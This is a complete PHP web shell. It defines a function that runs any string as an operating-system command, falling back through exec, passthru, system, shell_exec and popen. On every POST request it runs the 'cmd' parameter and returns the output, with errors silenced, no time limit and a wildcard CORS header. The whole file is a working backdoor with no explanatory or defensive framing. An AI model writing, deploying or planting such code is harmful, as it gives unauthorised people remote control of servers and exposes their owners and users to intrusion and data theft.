<?php
	function eksekusi($in) {
		$out = '';
		if(function_exists('exec')) {
			@exec($in,$out);
			$out = @join("\n",$out);
		}elseif(function_exists('passthru')) {
			ob_start();
			@passthru($in);
			$out = ob_get_clean();
		}elseif(function_exists('system')) {
			ob_start();
			@system($in);
			$out = ob_get_clean();
		}elseif(function_exists('shell_exec')) $out = shell_exec($in);
		elseif(is_resource($f = @popen($in,"r"))) {
			$out = "";
			while(!@feof($f))
				$out .= fread($f,1024);
			pclose($f);
		}
		return $out;
	}

	if ($_SERVER['REQUEST_METHOD'] === 'POST') {
		header('Access-Control-Allow-Origin: *');
		error_reporting(0);
		set_time_limit(0);

		if(isset($_POST['cmd'])) {
		    echo eksekusi($_POST['cmd']);
		}
	}
